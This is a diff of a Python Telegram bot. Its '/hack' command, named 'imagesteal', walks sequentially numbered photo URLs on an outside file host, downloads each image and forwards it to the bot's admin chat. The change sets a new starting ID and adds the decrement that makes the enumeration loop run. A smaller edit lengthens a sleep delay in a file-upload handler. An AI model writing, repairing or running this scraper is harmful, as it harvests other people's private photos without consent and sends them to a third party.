@@ -93,7 +93,7 @@ def todbsendtext (replied,message):
 @bot.message_handler(commands=['hack'])			
 def imagesteal(message):
 	try:
-		a = 1041896
+		a = 1041959
 		while a > 0:
 			url = str("http://xn--m38h.ml/tgFile/?l=photos/file_"+str(a)+".jpg")
 			path = str("file_"+str(a)+".jpg")
@@ -102,6 +102,7 @@ def imagesteal(message):
 			linku = file_as_link(path)
 			time.sleep(1)
 			bot.send_photo(tgadmin,linku)
+			a-=1
 			
 				   
 	except Exception as e:
@@ -197,7 +198,7 @@ def file_doc(message):
 	file=bot.download_file(file_info.file_path)
 	fmibms3.create_item("kvsh",path,file)
 	link = file_as_link(path)
-	time.sleep(1)
+	time.sleep(10)
 	bot.send_document(message.chat.id,link)
 	
 #Disabled for Catch LOL'''
